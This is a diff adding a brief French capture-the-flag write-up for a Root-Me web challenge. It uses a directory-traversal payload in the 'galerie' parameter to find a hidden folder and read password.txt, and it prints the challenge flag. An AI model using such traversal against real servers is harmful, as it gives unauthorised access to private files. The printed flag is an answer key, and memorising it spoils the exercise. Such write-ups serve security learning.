@@ -1,0 +1,10 @@
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r/password.txt
+Il suffit de manipuler le chemin entrée dans galerie pour comprendre la structure.
+Ex galerie=../
+En fouillant on trouve le dossier 86hwnX2r dans lequel est contenu le fichier password.txt pas atteignable via l'injection du chemin
+On sait aussi que ch15.php est contenu dans le repertoire que galerie.
+Il suffit de restituer le chemin jusqu'a password.txt depuis le repertoire dans lequel est contenu ch15.php
+
+http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt
+
+flag:kcb$!Bx@v4Gs9Ez 
